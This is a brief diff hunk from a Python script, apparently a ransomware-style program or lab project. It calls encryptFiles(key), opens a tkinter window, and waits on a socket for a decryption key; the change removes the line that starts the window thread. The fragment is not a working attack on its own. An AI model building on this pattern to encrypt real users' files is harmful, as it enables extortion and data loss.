@@ -172,7 +172,6 @@ if __name__ == "__main__":
                         encryptFiles(key)
                     #set up thread for tkinter window
                     visual = App(secSock)
-                    visual.start()
 
                     # recv waits for new input of key to decrypt
                     key = secSock.recv(4096)
